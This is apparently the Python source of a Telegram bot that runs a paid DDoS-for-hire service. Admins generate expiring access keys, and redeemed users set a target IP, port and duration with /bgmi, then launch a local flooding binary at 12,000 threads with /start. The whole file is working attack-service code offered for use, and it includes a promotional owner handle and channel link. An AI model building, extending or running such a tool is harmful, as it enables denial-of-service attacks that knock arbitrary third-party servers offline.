import subprocess
import json
import os
import random
import string
import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
from telegram import ReplyKeyboardMarkup, KeyboardButton
USER_FILE = "users.json"
KEY_FILE = "keys.json"
flooding_process = None
flooding_command = None
DEFAULT_THREADS = 12000
users = {}
keys = {}

def load_data():
    global users, keys
    users = load_users()
    keys = load_keys()

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading keys: {e}")
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')
    
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f" 🅺︎🅴︎🆈︎ 🅶︎🅴︎🅽︎🆁︎🅰︎🆃︎🅴︎🅳︎\n\n 🅈🄾🅄🅁 🄺🄴🅈 ᕗ {key}\n\n 🅅🄰🄻🄸🄳🄸🅃 ᕗ {expiration_date}\n\n🅁🄴🄳🄴🄴🄼  🅈🄾🅄🅁  🄺🄴🅈 ᕗ /redeem"
            except ValueError:
                response = f"𝙐𝙎𝘼𝙂𝙀 /genkey 1 𝙃𝙊𝙐𝙍𝙎 𝙖𝙣𝙙 𝘿𝘼𝙔𝙎"
        else:
            response = "𝙐𝙎𝘼𝙂𝙀 /genkey 1 𝙃𝙊𝙐𝙍𝙎 𝙖𝙣𝙙 𝘿𝘼𝙔𝙎"
    else:
        response = f"❌ 𝘼𝘾𝘾𝙀𝙎𝙎 𝘿𝙄𝙉𝙄𝙀𝘿. 𝘾𝙊𝙉𝙏𝘼𝘾𝙏 𝙏𝙊 𝙊𝙒𝙉𝙀𝙍 -@GODxAloneBOY"

    await update.message.reply_text(response)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    command = context.args
    if len(command) == 1:
        key = command[0]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"🔑 🅺︎🅴︎🆈︎ 🆁︎🅴︎🅳︎🅴︎🅴︎🅼︎ 🆂︎🆄︎🅲︎🅲︎🅴︎🆂︎🅵︎🆄︎🅻︎🅻︎🆈︎"
        else:
            response = f"𝘽𝙊𝙏 𝙊𝙒𝙉𝙀𝙍 - @GODxAloneBOY"
    else:
        response = f"𝙐𝙎𝙀 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝙏𝙊 𝙍𝙀𝘿𝙀𝙀𝙈 𝙆𝙀𝙔 ᕗ /redeem"

    await update.message.reply_text(response)


async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ 𝙔𝙊𝙐 𝘼𝙍𝙀 𝙉𝙊𝙏 𝘼𝙐𝙏𝙊𝙍𝙄𝙕𝙀𝘿. 𝘿𝙈 𝙊𝙒𝙉𝙀𝙍 @GODxAloneBOY")
        return

    if len(context.args) != 3:
        await update.message.reply_text(' 𝙀𝙓𝘼𝙈𝙋𝙇𝙀 𝙐𝙎𝙀  /bgmi «𝙄𝙋» «𝙋𝙊𝙍𝙏» «𝘿𝙐𝙍𝘼𝙏𝙊𝙄𝙉»')
        return

    target_ip = context.args[0]
    port = context.args[1]
    duration = context.args[2]

    flooding_command = ['./bgmi', target_ip, port, duration, str(DEFAULT_THREADS)]
    await update.message.reply_text(f'🔰 🆃︎🅰︎🆁︎🅶︎🅴︎🆃 ︎ 🆂︎🅴︎🆃 🔰︎\n\n👙 🅃🄰🅁🄶🄴🅃 ᕗ {target_ip}\n🍆 🄿🄾🅁🅃 ᕗ {port} \n⏳ 🄳🅄🅁🄰🅃🄾🄸🄽 ᕗ {duration}\n\n𝙏𝘼𝙋 𝙏𝙊 𝙎𝙏𝘼𝙍𝙏 𝘽𝙐𝙏𝙏𝙊𝙉')


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process, flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("𝙏𝘼𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝘼𝙉𝘿. /alone\n\n𝙅𝙊𝙄𝙉 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈 - https://t.me/+03wLVBPurPk2NWRl")
        return

    if flooding_process is not None:
        await update.message.reply_text('🔰 🅰︎🆃︎🆃︎🅰︎🅲︎🅺 ︎ 🅿︎🅴︎🅽︎🅳︎🅸︎🅽︎🅶 🔰︎\n\n𝙐𝙎𝙀 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝙏𝙊 𝙎𝙏𝙊𝙋 /stop')
        return

    if flooding_command is None:
        await update.message.reply_text('𝙏𝙊𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 /alone\n\n𝘾𝙊𝙉𝙏𝘼𝘾𝙏 𝙏𝙊 𝘽𝙊𝙏 𝙊𝙒𝙉𝙀𝙍- @GODxAloneBOY')
        return

    flooding_process = subprocess.Popen(flooding_command)
    await update.message.reply_text('🔰 🅰︎🆃︎🆃︎🅰︎🅲︎🅺︎  🆂︎🆃︎🅰︎🆁︎🆃︎🅴︎🅳 🔰︎\n𝙅𝙊𝙄𝙉 𝙈𝙔 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈 𝘾𝙃𝘼𝙉𝙉𝙀𝙇\n𝙎𝙀𝙉𝘿 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝙏𝙊 𝙊𝙒𝙉𝙀𝙍 @GODxAloneBOY\n\n🇮🇳 https://t.me/+03wLVBPurPk2NWRl ')


async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("𝙏𝙊𝙋 𝙏𝙊 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 /alone\n\n𝙅𝙊𝙄𝙉 𝙈𝙔 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈 𝘾𝙃𝘼𝙉𝙉𝙀𝙇- https://t.me/+03wLVBPurPk2NWRl")
        return

    if flooding_process is None:
        await update.message.reply_text('❌ 𝙀𝙍𝙍𝙊𝙍.  𝘼𝙏𝙏𝘼𝘾𝙆 𝙄𝙎 𝙉𝙊𝙏 𝙍𝙐𝙉𝙉𝙄𝙂 ')
        return

    flooding_process.terminate()
    flooding_process = None
    await update.message.reply_text('🔰 🅰︎🆃︎🆃︎🅰︎🅲︎🅺︎  🆂︎🆃︎🅾︎🅿︎🅳 🔰︎\n\n𝙏𝙊𝙋 𝙏𝙊 𝙍𝙀𝙎𝙏𝘼𝙍𝙏 𝘼𝙏𝙏𝘼𝘾𝙆 /start')
    
    await update.message.reply_text(response)

# Update the alome_command function to include buttons
async def alone_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Create buttons
    markup = ReplyKeyboardMarkup(
        [
            [KeyboardButton("/bgmi"), KeyboardButton("/start")],
            [KeyboardButton("/stop")]
        ],
        resize_keyboard=False
    )
    
    response = (
        "𝘼𝙇𝙇 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎\n\n"
        "/genkey-> ༒︎ genrate you key\n"
        "/redeem-> ༒ ︎ redeem your key\n"
        "/bgmi->   ༒︎ set your attack target\n"
        "/start->   ༒ ︎tap to launch attack \n"
        "/stop->   ༒︎ tap to attack Stopd\n\n"
        f"✅𝙊𝙒𝙉𝙀𝙍-> {OWNER_USERNAME}"
    ) # Send message with the keyboard buttons
    await update.message.reply_text(response, reply_markup=markup)

def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("alone", alone_command))

    load_data()
    application.run_polling()

if __name__ == '__main__':
    main()
